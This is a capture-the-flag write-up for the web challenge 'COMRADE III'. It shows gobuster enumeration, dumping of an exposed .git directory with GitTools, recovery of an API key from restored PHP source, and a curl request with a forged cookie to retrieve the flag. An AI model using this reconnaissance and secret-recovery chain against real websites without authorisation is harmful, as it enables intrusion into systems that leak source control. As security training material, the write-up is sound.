## COMRADE III
```
Hey Comrade , World War III will begin soon , we need to reveal what was hidden.
```
- Link: http://ec2-35-158-236-11.eu-central-1.compute.amazonaws.com/comrade/

#### Solve:

- Step 1

    - By running the following command:
        ```commandline
        gobuster dir -u http://ec2-35-158-236-11.eu-central-1.compute.amazonaws.com/comrade/ -w /usr/share/wordlists/dirb/common.txt
        ```
    
    - The result of gobuster:
        ```
        /.git/HEAD (Status: 200)
        /index.php (Status: 200)
        ```
    
    - We are interested in the files with status *200*
        ```commandline
        /.git/HEAD
        ```
- Step 2

    - Dumping *.git* by using [GitTools](https://github.com/internetwache/GitTools.git) *Dumper*
        ```commandline
        ./gitdumper.sh http://ec2-35-158-236-11.eu-central-1.compute.amazonaws.com/comrade/.git/ comrade
        ```
        where MaximumCourage is the dest-dir
        
    - Extracting info manually
        
        by running
        ```commandline
        >> cd comrade/ && git status
      
        On branch master
        Changes not staged for commit:
        (use "git add/rm <file>..." to update what will be committed)
        (use "git restore <file>..." to discard changes in working directory)
          deleted:    api.php
          deleted:    contact_process.php
          deleted:    index.php
          deleted:    x.jpg
        ```
        as we can see that there are multiple php files that we can restore
        
    - Restoring the flag
    
        by running
        ```commandline
        >> git restore .
        >> ls
        api.php  contact_process.php  index.php
        ```
        
        - the *"index.php"* is not useful in this case, so we will ignore it
    
    - But by looking at the *"api.php"*
        ```commandline
        >> cat api.php
      
        <?php
        include('./access.php');
        include('./index.php');
        if($_COOKIE['api_key'] == $apikey) 
        echo "Flag: $flag";
        ```
      
        - we can see that the api will reveal the flag once we have a "api_key" cookie equals to some value we don't know yet.
    
    - But by looking at the *"contact_process.php"*
    
        ```commandline
        >> cat contact_process.php
      
        <?php
        
            $to = "comrade1995@gmail.com";
            $from = $_REQUEST['email'];
            $name = $_REQUEST['name'];
            $subject = $_REQUEST['subject'];
            $number = $_REQUEST['number'];
            $cmessage = $_REQUEST['message'];
        
            $headers = "From: $from";
                $headers = "From: " . $from . "\r\n";
                $headers .= "Reply-To: ". $from . "\r\n";
                $headers .= "MIME-Version: 1.0\r\n";
                $headers .= "Content-Type: text/html; charset=ISO-8859-1\r\n";
        
            $subject = "You have a message from your Bitmap Photography.";
        
            $logo = 'img/logo.png';
            $link = '#';
                $access = bin2hex('this_is_top_secret');
                $body = "<!DOCTYPE html><html lang='en'><head><meta charset='UTF-8'><title>Express Mail</title></head><body>";
                $body .= "<table style='width: 100%;'>";
                $body .= "<thead style='text-align: center;'><tr><td style='border:none;' colspan='2'>";
                $body .= "<a href='{$link}'><img src='{$logo}' alt=''></a><br><br>";
                $body .= "</td></tr></thead><tbody><tr>";
                $body .= "<td style='border:none;'><strong>Name:</strong> {$name}</td>";
                $body .= "<td style='border:none;'><strong>Email:</strong> {$from}</td>";
                $body .= "</tr>";
                $body .= "<tr><td style='border:none;'><strong>Subject:</strong> {$csubject}</td></tr>";
                $body .= "<tr><td></td></tr>";
                $body .= "<tr><td colspan='2' style='border:none;'>{$cmessage}</td></tr>";
                $body .= "</tbody></table>";
                $body .= "</body></html>";
        
            $send = mail($to, $subject, $body, $headers);
        
        ?>
        ```
      
        - NOTICE: that the *$access* variable is declared and assigned to a value, but actually it's not used anywhere in the code.
    
- Step 3
    
     - Now we need to know the value of the *$access* variable, so we can do something like this
         
       ```commandline
         >> echo "<?php echo bin2hex('this_is_top_secret'); ?>" > access.php && php access.php
         746869735f69735f746f705f736563726574
         ```
     
     - We got the value *746869735f69735f746f705f736563726574* of the *$access* variable.
     
     - Next, we need to set a cookie *api_key* to the value of the *$access* variable and make a request to the *api.php*.

     - In this case, *curl* is our friend:
        ```commandline
        curl http://ec2-35-158-236-11.eu-central-1.compute.amazonaws.com/comrade/api.php --cookie "api_key=746869735f69735f746f705f736563726574"
        ```
       
        - Result:
        ```html
        <!DOCTYPE html>
        <head>
            <title>COMRADE |||</title>
        </head>
        <body style="margin:0px;padding:0px;background-color:#000;color:#01ba17">
            <div style="padding:100px;width:70%;margin: 0px auto;font-size:26px;">
            <img src="./x.jpg" style="width:30%;height:30%;">
            <div style="padding:100px;width:30%; display:inline;">Welcome Comrade</div>
            </div>
            
        </body>
        </html><center><h3>Flag{g!7_!5_4w350m3_XD!!}
        ```

> **Flag: Flag{g!7_!5_4w350m3_XD!!}**

##### Notice: we didn't focus on the jpg file as it's a corrupted file, we need't to bother ourselves to deal with it as it's a web challenge
